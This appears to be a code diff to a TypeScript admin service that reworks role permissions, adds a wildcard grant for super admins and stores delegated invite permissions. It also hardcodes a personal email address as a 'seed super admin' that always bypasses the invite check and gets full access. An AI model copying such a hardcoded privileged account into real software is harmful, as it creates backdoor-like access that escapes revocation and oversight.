@@ -21,10 +21,14 @@ import { MessagingService } from '../services/messaging.service';
 
 type AdminRole = 'support' | 'engineer' | 'super_admin';
 
+/** Immutable seed super admin — always bypasses invite check. */
+const SEED_SUPER_ADMIN = 'rudra195957@gmail.com';
+
 const ALL_PERMISSIONS = [
   'view:all',
   'mutate:users',
   'mutate:invites',
+  'can_invite',
   'mutate:api_keys',
   'mutate:feature_flags',
   'mutate:service_controls',
@@ -83,23 +87,18 @@ const DEFAULT_SERVICE_CONTROLS = [
   },
 ] as const;
 
-function assertRole(actor: AdminActor, allowedRoles: AdminRole[]) {
-  if (!allowedRoles.includes(actor.role)) {
-    throw new UnauthorizedException('You do not have permission to perform this action.');
-  }
-}
-
-/** Granular permission check. Super admins bypass all checks. */
+/** Granular permission check. Supports '*' wildcard for super admins. */
 function assertPermission(actor: AdminActor, required: Permission) {
+  if (actor.permissions.includes('*')) return;
   if (actor.role === 'super_admin') return;
   if (!actor.permissions.includes(required)) {
     throw new UnauthorizedException(`Missing required permission: ${required}`);
   }
 }
 
-/** Resolve effective permissions: super_admins get ALL, others get what's stored. */
+/** Resolve effective permissions: super_admins get ['*'] (wildcard), others get what's stored. */
 function resolvePermissions(role: AdminRole, stored: string[]): string[] {
-  if (role === 'super_admin') return [...ALL_PERMISSIONS];
+  if (role === 'super_admin') return ['*'];
   return stored.length > 0 ? stored : ['view:all'];
 }
 
@@ -234,7 +233,9 @@ export class CommandCenterService {
       `${clerkUser.firstName ?? ''} ${clerkUser.lastName ?? ''}`.trim() || primaryEmail;
     const existingAdmin = await this.getAdminByClerkOrEmail(clerkId, primaryEmail);
     const pendingInvite = await this.getPendingInvite(primaryEmail);
-    const isBootstrapAdmin = this.bootstrapSuperAdmins.has(primaryEmail.toLowerCase());
+    const isBootstrapAdmin =
+      this.bootstrapSuperAdmins.has(primaryEmail.toLowerCase()) ||
+      primaryEmail.toLowerCase() === SEED_SUPER_ADMIN.toLowerCase();
 
     console.log(`[CommandCenterAuth] Checking access for: ${primaryEmail}`);
     console.log(`[CommandCenterAuth] Is bootstrap admin? ${isBootstrapAdmin}`);
@@ -248,13 +249,15 @@ export class CommandCenterService {
 
     if (!admin) {
       if (!pendingInvite && !isBootstrapAdmin) {
-        throw new UnauthorizedException('Your account has not been invited to the Command Center.');
+        throw new UnauthorizedException('403 Forbidden: Unauthorized Entity');
       }
 
       const nextRole = isBootstrapAdmin ? 'super_admin' : pendingInvite?.role;
       if (!nextRole) {
         throw new UnauthorizedException('Unable to resolve the invited admin role.');
       }
+
+      const seedPermissions = isBootstrapAdmin ? ['*'] : (pendingInvite?.permissions ?? []);
 
       const [createdAdmin] = await db
         .insert(adminUsers)
@@ -263,6 +266,7 @@ export class CommandCenterService {
           email: primaryEmail,
           name: fullName,
           role: nextRole,
+          permissions: seedPermissions,
           status: 'active',
           invitedByAdminUserId: pendingInvite?.invitedByAdminUserId ?? null,
           activatedAt: new Date(),
@@ -289,6 +293,7 @@ export class CommandCenterService {
       }
 
       const nextRole = isBootstrapAdmin ? 'super_admin' : admin.role;
+      const seedPermissions = isBootstrapAdmin ? ['*'] : undefined;
 
       const [updatedAdmin] = await db
         .update(adminUsers)
@@ -297,6 +302,7 @@ export class CommandCenterService {
           email: primaryEmail,
           name: fullName,
           role: nextRole,
+          ...(seedPermissions ? { permissions: seedPermissions } : {}),
           status: 'active',
           activatedAt: admin.activatedAt ?? new Date(),
           lastLoginAt: new Date(),
@@ -421,11 +427,13 @@ export class CommandCenterService {
     assertPermission(actor, 'mutate:invites');
 
     // Delegation enforcement: cannot assign permissions you don't have
-    const _grantedPermissions = (input.permissions ?? ['view:all']).filter((perm) =>
-      actor.permissions.includes(perm),
+    // Delegation enforcement: only grant permissions the inviter themselves has
+    const actorPerms = actor.permissions.includes('*') ? [...ALL_PERMISSIONS] : actor.permissions;
+    const grantedPermissions = (input.permissions ?? ['view:all']).filter((perm) =>
+      actorPerms.includes(perm),
     );
 
-    // Cannot assign a role higher than your own
+    // Cannot assign a role higher than your own (super_admin bypasses this)
     const roleHierarchy: Record<AdminRole, number> = { support: 0, engineer: 1, super_admin: 2 };
     if (roleHierarchy[input.role] >= roleHierarchy[actor.role] && actor.role !== 'super_admin') {
       throw new Error('You cannot assign a role equal to or higher than your own.');
@@ -443,6 +451,7 @@ export class CommandCenterService {
       .values({
         email,
         role: input.role,
+        permissions: grantedPermissions,
         invitedByAdminUserId: actor.id,
         inviteToken,
         expiresAt,
